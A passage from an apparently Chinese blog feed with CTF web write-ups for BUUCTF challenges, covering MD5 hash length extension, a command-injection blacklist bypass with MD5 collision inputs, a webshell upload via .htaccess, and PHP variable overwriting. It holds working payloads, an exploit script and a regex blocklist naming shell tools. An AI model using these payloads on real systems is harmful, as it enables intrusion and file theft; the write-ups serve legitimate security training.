class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>附带Hint: flag is in ./flag.txt<br>审计之:</p><ol><li>三个路由,index用来获取源码,geneSign用来生成md5,De1ta为挑战.</li><li>在 /De1ta 中使用 get 传参 param ,在 cookie 里用 action sign 去读取 flag.txt,其中param=flag.txt,action 中要含有 read 和 scan,且 sign=md5(secert_key + param + action)<h3 id="方法一-哈希拓展攻击"><a href="#方法一-哈希拓展攻击" class="headerlink" title="方法一:哈希拓展攻击"></a>方法一:哈希拓展攻击</h3></li></ol><p><a href="https://joychou.org/web/hash-length-extension-attack.html" target="_blank" rel="noopener">详细资料</a></p><p>简单说下md5算法,分为md5 padding和md5 compress</p><figure class="image-box">                <img src="./18.png" alt="图片" title class>                <p>图片</p>            </figure><p>对输入的一串字符进行md5 padding后,如果这串字符的字节长度对64求余结果不为56,就会填充一个x80和xx个0使得对64求余的结果等于56,此时字符串的字节长度为n*64+56,并且最后8个字节用来记录原始输入信息长度</p><p>例如对admin进行md5 padding处理后为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">61646d696e8000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002800000000000000</span><br></pre></td></tr></table></figure><p>61646d696e  为admin的hex<br>80  为第一个填充块,后面的一大串0也是填充</p><p>2800000000000000  实际值为0000000000000028,十进制的40,单位为bit,为5个字节(admin)</p><p>md5算法里有四个向量(Magic number)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x67452301L, 0xefcdab89L, 0x98badcfeL, 0x10325476L</span><br></pre></td></tr></table></figure><p>初始化的4个Magic number会和第一个64字节的Message block进行md5 compress压缩算法,压缩算法完成后会产生新的4个Magic number,再进行第二个64字节Message block的md5 compress压缩算法,直到压缩到最后64个字节的(Message block + padding),最后得到的Magic number经过hex转化就是最后的md5 hash值<br>所以当已知 md5(salt+message)的值 message内容 salt+message长度 时,就可以在不知道salt的具体内容情况下计算出任意的md5(salt+message+padding+append)值,逆向出最后一次的4个Magic number<a href="https://github.com/JoyChou93/md5-extension-attack" target="_blank" rel="noopener">大佬的攻击脚本</a></p><p>回归正题</p><p>geneSign里的request.args.get()方法可以用来请求上下文,即可以用来读取文件内容,先读取一下flag.txt,获得一串md5,是md5(secert_key + ‘flag.txt’ + ‘scan’) 的值,而我们需要的是获取 md5(secert_key + ‘flag.txt’ + ‘readscan’) 的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/geneSign?param=flag.txt</span><br><span class="line">62bc8d3947680a751bfb41f9e69631d9</span><br></pre></td></tr></table></figure><p>使用hashpump工具进行哈希长度扩展攻击<br><figure class="image-box">                <img src="./19.png" alt="图片" title class>                <p>图片</p>            </figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">02093a8c2c49c37477f5053717930316</span><br><span class="line">scan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\x00\x00\x00\x00read</span><br></pre></td></tr></table></figure><p>需要在执行前把转义字符\x变成%然后将这两串传入cookie,脚本如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &apos;http://e695ad48-e686-4361-a809-93147a6a1133.node3.buuoj.cn/De1ta?param=flag.txt&apos;</span><br><span class="line">cookies = &#123;</span><br><span class="line">  &apos;sign&apos;: &apos;02093a8c2c49c37477f5053717930316&apos;,</span><br><span class="line">  &apos;action&apos;: &apos;scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read&apos;,</span><br><span class="line">  &#125;</span><br><span class="line">res = requests.get(url=url, cookies=cookies)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure></p><p>收到回复信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 hashcookie.py</span><br><span class="line">&#123;&quot;code&quot;: 200, &quot;data&quot;: &quot;flag&#123;40fac20a-bded-4216-889f-ac089966e6d4&#125;\n&quot;&#125;</span><br></pre></td></tr></table></figure></p><h3 id="方法二-字符串拼接"><a href="#方法二-字符串拼接" class="headerlink" title="方法二:字符串拼接"></a>方法二:字符串拼接</h3><p>后两种方法是看大佬博客的,跟着复现学一波</p><p>geneSign里的param在方法定义里只有scan的功能,要想实现readscan可以根据python里对md5()方法里参数的拼接,采用字符串拼接的形式,看一下这两块的逻辑</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def geneSign():</span><br><span class="line">    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    action = &quot;scan&quot;</span><br><span class="line">    return getSign(action, param)</span><br><span class="line">def getSign(action, param):</span><br><span class="line">    return hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure><p>在访问/geneSign?param=flag.txt的时候,返回的数据应该是 md5(‘secert_key’ + ‘flag.txt’ + ‘scan’)<br>在md5()方法里相当于 md5(secert_keyflag.txtscan)</p><p>所以当我们传入的数据为 /geneSign?param=flag.txtread 时就拼接出了md5(‘secert_keyflag.txtreadscan’),直接获取到cookie</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/geneSign?param=flag.txtread</span><br><span class="line">cb6a31cfc19b4162449c235bac8251b7</span><br></pre></td></tr></table></figure><p>接着抓包访问 /De1ta?param=flag.txt 构造cookie<br>action=readscan;sign=cb6a31cfc19b4162449c235bac8251b7</p><figure class="image-box">                <img src="./20.png" alt="图片" title class>                <p>图片</p>            </figure><p>flag{40fac20a-bded-4216-889f-ac089966e6d4}</p><h3 id="方法三-local-file"><a href="#方法三-local-file" class="headerlink" title="方法三:local_file"></a>方法三:local_file</h3><p>和第二种方法类似,但在文件内容读取上用了local_file函数,与之相关的是CVE-2019-9948,存在不必要的URL方案以允许local_file://读取urllib中的文件</p><p>进行读取的话,flag.txt的路径是 local_file:///app/flag.txt,其余步骤与方法二相似</p><p>这里是使用的 urllib.urlopen(param) 去包含的文件,所以可以直接加上文件路径 flag.txt 或 ./flag.txt 去访问,也可以使用类似的 file:///app/flag.txt 去访问,但是 file 关键字在黑名单里,可以使用 local_file 代替,​ 如果使用 urllib2.urlopen(param) 去包含文件就必须加上 file ,否则会报 ValueError: unknown url type: /path/to/file 的错误.</p><h2 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h2><p><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">http://0</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">e8b</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">ac</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">5e</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">-</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">a39d</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">-418</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">f-9</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">4</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">6e</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">-52</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">7</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">4</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">96</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">c</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">2ba0b</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">.node3.buuoj.cn</a></p><p>查看源码,有一句提示 md5 is funny ~</p><p>观察url的变量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</span><br><span class="line">对img进行base64解码</span><br><span class="line">MzUzNTM1MmU3MDZlNjc=</span><br><span class="line">再解一次</span><br><span class="line">3535352e706e67</span><br><span class="line">解一次hex</span><br><span class="line">555.png</span><br></pre></td></tr></table></figure><p>猜测能进行文件读取,构造index.php查下源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">index.php</span><br><span class="line">696e6465782e706870</span><br><span class="line">Njk2ZTY0NjU3ODJlNzA2ODcw</span><br><span class="line">TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</span><br><span class="line">/index.php?img=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&amp;cmd=</span><br></pre></td></tr></table></figure></p><p>对图片里的base64进行解密<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line">$cmd = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'img'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>])) </span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'img'</span>])));</span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>, <span class="string">""</span>, $file);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/flag/i"</span>, $file)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;img src ="./ctf3.jpeg"&gt;'</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"xixi～ no flag"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span> . $txt . <span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$img对文件进行base64源码读取</span></span><br><span class="line"><span class="keyword">echo</span> $cmd;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i"</span>, $cmd)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"forbid ~"</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="comment">//对$cmd进行了过滤,但过滤反斜杠 |\\|\\\\| 正则没有写好,可导致反斜杠逃逸</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((string)$_POST[<span class="string">'a'</span>] !== (string)$_POST[<span class="string">'b'</span>] &amp;&amp; md5($_POST[<span class="string">'a'</span>]) === md5($_POST[<span class="string">'b'</span>])) &#123;</span><br><span class="line"><span class="comment">//md5强类型比较,需要md5碰撞</span></span><br><span class="line">        <span class="keyword">echo</span> `$cmd`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">"md5 is funny ~"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:url(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:<span class="comment">#CCCCCC;</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>对于本题php反斜杠的正则 |\|\\| 形成的反斜杠逃逸,可以解析一下过程</p><ol><li>\ 先经过PHP正则解析器为一个\</li><li>\ 又跟’|’结合到一起,从而在正则表达式的解析器解析为|</li><li>又因为’|’是正则中的保留符号,所以需要一个转义符来转义.所以\|这个的结果就是匹配 ‘|’</li><li>后面又跟了\\,这里先经过PHP正则解析器为 \,然后在经过正则表达式的解析器为 ‘\’</li><li>最后的正则表达式就是匹配’|\’而不是’|’和’\’,形成反斜杠逃逸</li></ol><p>根据分析构造payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=ca\t%20/flag</span><br></pre></td></tr></table></figure><p>在md5里有一些md5串编码不同但值相同,就可以用来碰撞绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure></p><p>需要抓包改成post传参<br><figure class="image-box">                <img src="./21.png" alt="图片" title class>                <p>图片</p>            </figure></p><p>flag{5e4e259d-460a-4ca9-ab42-9641bf7f9179}</p><h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p><a href="http://434077c3-498f-4c11-a729-f0163dbfb84f.node3.buuoj.cn" target="_blank" rel="noopener">http://434077c3-498f-4c11-a729-f0163dbfb84f.node3.buuoj.cn</a></p><p>尝试上传一句话图片马,提示说后缀名不能有ph</p><figure class="image-box">                <img src="./22.png" alt="图片" title class>                <p>图片</p>            </figure><p>那就上传.htaccess</p><figure class="image-box">                <img src="./23.png" alt="图片" title class>                <p>图片</p>            </figure><p>再把图片上传</p><figure class="image-box">                <img src="./24.png" alt="图片" title class>                <p>图片</p>            </figure><p>蚁剑连上</p><figure class="image-box">                <img src="./25.png" alt="图片" title class>                <p>图片</p>            </figure><p>flag{4d82a478-0cbd-41f0-ab29-ae2d943d8705}</p><h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p><a href="http://75fc63bc-7ecb-4732-a3f9-26b5dea705f6.node3.buuoj.cn" target="_blank" rel="noopener">http://75fc63bc-7ecb-4732-a3f9-26b5dea705f6.node3.buuoj.cn</a></p><p>页面没啥利用点,我的扫描器经常扫不到.git,还是用自己的脚本扫下目录</p><figure class="image-box">                <img src="./26.png" alt="图片" title class>                <p>图片</p>            </figure><p>一堆弱相应,但存在.git,用githack恢复,看到有flag.php文件,但没恢复出来</p><figure class="image-box">                <img src="./27.png" alt="图片" title class>                <p>图片</p>            </figure><p>以前做题好像也有这种情况,翻了翻以前的<a href="http://www.damyahome.top/8307%E5%92%8C8302%E9%9D%B6%E5%9C%BAweb%E9%A2%98wp/" target="_blank" rel="noopener">文章</a></p><p>尝试用gittool工具里的Dumper和Extractor获得完整源码,失败</p><p>奇怪了就是恢复不过来,我换靶机也恢复不过来,只能看着别人博客的源码</p><p>flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = file_get_contents(<span class="string">'/flag'</span>);</span><br><span class="line"><span class="comment">//flag.php只起到一个输出作用</span></span><br></pre></td></tr></table></figure><p>index.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//html略</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">$yds = <span class="string">"dog"</span>;</span><br><span class="line">$is = <span class="string">"cat"</span>;</span><br><span class="line">$handsome = <span class="string">'yds'</span>;</span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//支持get和post传参的数组遍历</span></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">'flag'</span>] === $x &amp;&amp; $x !== <span class="string">'flag'</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>]) &amp;&amp; !<span class="keyword">isset</span>($_POST[<span class="string">'flag'</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>($yds);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'flag'</span>] === <span class="string">'flag'</span>  || $_GET[<span class="string">'flag'</span>] === <span class="string">'flag'</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>($is);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//还加了三层过滤规则</span></span><br><span class="line"><span class="comment">//1.不管是get还是post,flag都不能等于flag,否则退出</span></span><br><span class="line"><span class="comment">//2.检测get或post是否有flag,没有则退出</span></span><br><span class="line"><span class="comment">//3.如果get的flag不等于flag,退出</span></span><br><span class="line"><span class="comment">//也就是要求get的flag=flag,但不能post或者get的flag=flag</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"the flag is: "</span>.$flag;</span><br></pre></td></tr></table></figure></p><p>看一下foreach函数,在不改变flag的情况下exit()也能作为输出,本题的思路就是变量覆盖<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">foreach</span><br><span class="line">(PHP 4, PHP 5, PHP 7)</span><br><span class="line">foreach 语法结构提供了遍历数组的简单方式。foreach 仅能够应用于数组和对象，如果尝试应用于其他数据类型的变量，或者未初始化的变量将发出错误信息。有两种语法：</span><br><span class="line">foreach (array_expression as $value)</span><br><span class="line">    statement</span><br><span class="line">foreach (array_expression as $key =&gt; $value)</span><br><span class="line">    statement</span><br><span class="line">第一种格式遍历给定的 array_expression 数组。每次循环中，当前单元的值被赋给 $value 并且数组内部的指针向前移一步（因此下一次循环中将会得到下一个单元）。</span><br><span class="line">第二种格式做同样的事，只除了当前单元的键名也会在每次循环中被赋给变量 $key。</span><br></pre></td></tr></table></figure></p><h3 id="方法一-GET"><a href="#方法一-GET" class="headerlink" title="方法一:GET"></a>方法一:GET</h3><p>get里只要能构成变量覆盖,用$yds或$is都行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">foreach($_GET as $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果是yds=flag<br>$x=yds,$y=flag,所以$$x=$yds,$$y=$flag</p><p>$$x = $$y,也就是$yds=$flag</p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yds=flag</span><br></pre></td></tr></table></figure><p>如果是is=flag<br>$x=is,$y=flag,所以$$x=$is,$$y=$flag</p><p>$$x = $$y,也就是$is=$flag</p><p>又因为要求flag=flag,所以$x=flag,$y=flag,带进去变成$flag=$flag</p><p>将两种情况连接起来</p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">is=flag&amp;flag=flag</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./28.png" alt="图片" title class>                <p>图片</p>            </figure><p>flag{64be7429-88b0-4318-8e17-3a7efb7a540a}</p><h3 id="方法二-GET-POST"><a href="#方法二-GET-POST" class="headerlink" title="方法二:GET+POST"></a>方法二:GET+POST</h3><p>在post里也可以进行一次变量覆盖</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">foreach($_POST as $x =&gt; $y)&#123;</span><br><span class="line">$$x = $y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要post一个等式使得执行后为$$flag=$flag,即$flag=flag<br>然后get传参为yds=flag,详细看方法一</p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET:</span><br><span class="line">yds=flag</span><br><span class="line">POST:</span><br><span class="line">$flag=flag</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;GYCTF2020-Blacklist&quot;&gt;&lt;a href=&quot;#GYCTF2020-Blacklist&quot; class=&quot;headerlink&quot; title=&quot;[GYCTF2020]Blacklist&quot;&gt;&lt;/a&gt;[GYCTF2020]Blacklist&lt;/h2&gt;&lt;p&gt;
      
    
    </summary>
    
    
      <category term="ctf writeup web" scheme="https://www.damyahome.github.io/categories/ctf-writeup-web/"/>
    
    
      <category term="个人ctf竞赛" scheme="https://www.damyahome.github.io/tags/%E4%B8%AA%E4%BA%BActf%E7%AB%9E%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF web练习4</title>
    <link href="https://www.damyahome.github.io/ctf-writeup-web/ckwd913bs002cpwuclqnd2krp/BUUCTF-web%E7%BB%83%E4%B9%A04/"/>
    <id>https://www.damyahome.github.io/ctf-writeup-web/ckwd913bs002cpwuclqnd2krp/BUUCTF-web%E7%BB%83%E4%B9%A04/</id>
    <published>2020-10-05T09:50:50.000Z</published>
    <updated>2020-10-05T09:58:42.403Z</updated>
    
    <content type="html"><![CDATA[<p>web题自然是想md形式,看着好看,奈何本地报错,pdf凑合看吧</p><p>pdf插件加载比较慢,请稍等一下下哈<br><div class="row">    <embed src="BUUCTF_web练习4.pdf" width="100%" height="550" type="application/pdf"></div></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;web题自然是想md形式,看着好看,奈何本地报错,pdf凑合看吧&lt;/p&gt;
&lt;p&gt;pdf插件加载比较慢,请稍等一下下哈&lt;br&gt;

	&lt;div class=&quot;row&quot;&gt;
    &lt;embed src=&quot;BUUCTF_web练习4.pdf&quot; width=&quot;100%&quot; height
      
    
    </summary>
    
    
      <category term="ctf writeup web" scheme="https://www.damyahome.github.io/categories/ctf-writeup-web/"/>
    
    
      <category term="个人ctf竞赛" scheme="https://www.damyahome.github.io/tags/%E4%B8%AA%E4%BA%BActf%E7%AB%9E%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>SQL报错注入小结</title>
    <link href="https://www.damyahome.github.io/web%E5%AD%A6%E4%B9%A0/ckwd913cw003vpwuctefakhs7/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/"/>
    <id>https://www.damyahome.github.io/web%E5%AD%A6%E4%B9%A0/ckwd913cw003vpwuctefakhs7/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/</id>
    <published>2020-10-02T07:48:06.000Z</published>
    <updated>2020-10-02T07:55:20.735Z</updated>
    
